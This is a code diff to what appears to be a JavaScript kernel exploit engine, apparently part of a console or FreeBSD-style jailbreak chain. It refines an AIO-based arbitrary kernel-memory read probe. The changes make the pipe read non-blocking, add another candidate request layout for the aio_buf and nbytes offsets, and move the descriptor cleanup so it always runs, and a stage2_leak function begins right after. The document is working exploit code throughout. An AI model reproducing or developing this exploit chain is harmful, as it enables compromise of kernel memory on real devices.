@@ -1172,6 +1172,7 @@ export function makeBagagwaEngine(X) {
         const known = i64(0x805c0210, 0xffffffff); // aio_multi_wait body (writeup)
         const SIZE = 0x20;
         note("[ARB] AIO arbitrary-read probe (known=0xffffffff805c0210)");
+        let rfd = -1, wfd = -1;
         try {
             const pfd = safeAlloc(8, "arb-pipe");
             const reqs = safeAlloc(0x28, "arb-reqs");
@@ -1181,12 +1182,17 @@ export function makeBagagwaEngine(X) {
             w32(pfd.u8, 0, 0); w32(pfd.u8, 4, 0);
             const pr = await sys(SYS_PIPE2, pfd.base, 0);
             if (pr.failed) { note("[ARB] pipe2 failed " + pr.errText); return; }
-            const rfd = r32(pfd.u8, 0) | 0, wfd = r32(pfd.u8, 4) | 0;
+            rfd = r32(pfd.u8, 0) | 0; wfd = r32(pfd.u8, 4) | 0;
             track(rfd); track(wfd);
 
+            // An empty-pipe read MUST NOT block: a blocking read here wedges the
+            // whole chain worker (seen last run as WATCHDOG on the NEXT syscall).
+            const fl = await sys(SYS_FCNTL, rfd, 4, 4); // F_SETFL, O_NONBLOCK
+            note("[ARB] fcntl(O_NONBLOCK) ret=" + fl.s32 + " err=" + fl.errText);
+
             // candidate layouts: [aio_buf offset, aio_nbytes offset]. lapse puts
-            // aio_buf at +0x10 and fd at +0x20; nbytes is +0x08 or +0x18.
-            const layouts = [[0x10, 0x08], [0x10, 0x18]];
+            // aio_buf at +0x10 and fd at +0x20; nbytes is +0x08/+0x18/+0x00.
+            const layouts = [[0x10, 0x08], [0x10, 0x18], [0x10, 0x00]];
             for (let li = 0; li < layouts.length; li++) {
                 const bo = layouts[li][0], no = layouts[li][1];
                 for (let z = 0; z < 0x28; z++) reqs.u8[z] = 0;
@@ -1197,23 +1203,23 @@ export function makeBagagwaEngine(X) {
                 let sub;
                 try { sub = await sys(SYS_AIO_SUBMIT_CMD, AIO_CMD_MULTI_WRITE, reqs.base, 1, 3, ids.base); }
                 catch (e) { note("[ARB] L" + li + " submit threw " + (e && e.message ? e.message : e)); continue; }
-                note("[ARB] L" + li + " (buf+" + bo.toString(16) + ",nbytes+" + no.toString(16) +
-                    ") submit ret=" + sub.s32 + " err=" + sub.errText);
-                await sleep(120);
+                await sleep(150);
+                const id = r32(ids.u8, 0) | 0;
                 const rd = await sys(SYS_READ, rfd, rbuf.base, SIZE);
                 let hex = "";
-                const got = rd.failed ? 0 : (rd.s32 > 0 ? rd.s32 : 0);
+                const got = (rd.failed || rd.s32 <= 0) ? 0 : rd.s32;
                 for (let i = 0; i < got && i < SIZE; i++)
                     hex += rbuf.u8[i].toString(16).padStart(2, "0") + " ";
-                note("[ARB] L" + li + " pipe read ret=" + rd.s32 + " err=" + rd.errText +
+                note("[ARB] L" + li + " (buf+" + bo.toString(16) + ",nbytes+" + no.toString(16) +
+                    ") submit=" + sub.s32 + " id=" + id + " read=" + rd.s32 + "/" + rd.errText +
                     (hex ? " bytes: " + hex : " (no bytes)"));
                 if (got >= 4) break;
             }
-            try { await sys(SYS_CLOSE, rfd); } catch (_) {}
-            try { await sys(SYS_CLOSE, wfd); } catch (_) {}
         } catch (e) {
             note("[ARB] threw " + (e && e.message ? e.message : e));
         }
+        try { if (rfd >= 0) await sys(SYS_CLOSE, rfd); } catch (_) {}
+        try { if (wfd >= 0) await sys(SYS_CLOSE, wfd); } catch (_) {}
     }
 
     async function stage2_leak(opts) {
